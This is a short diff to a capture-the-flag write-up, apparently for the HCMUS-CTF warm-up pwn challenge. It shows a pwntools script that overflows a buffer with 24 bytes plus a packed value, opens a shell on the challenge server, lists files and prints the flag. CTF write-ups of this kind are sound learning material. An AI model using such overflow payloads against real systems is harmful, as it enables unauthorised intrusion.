@@ -41,8 +41,19 @@ from pwn import *
 conn = remote('61.28.237.24', 30200)
 conn.sendlineafter("?", b'a' * 24 + p32(0xcabbfeff))
 conn.interactive()
-ls
-cat flag.txt
 ```
 
-Flag: `HCMUS-CTF{Just_A_Warm_Up_Pwn}`
+```
+$ ls
+bin
+dev
+flag.txt
+hpbd
+lib
+lib32
+lib64
+$ cat flag.txt
+HCMUS-CTF{Just_A_Warm_Up_Pwn}
+```
+
+**Flag:** `HCMUS-CTF{Just_A_Warm_Up_Pwn}`
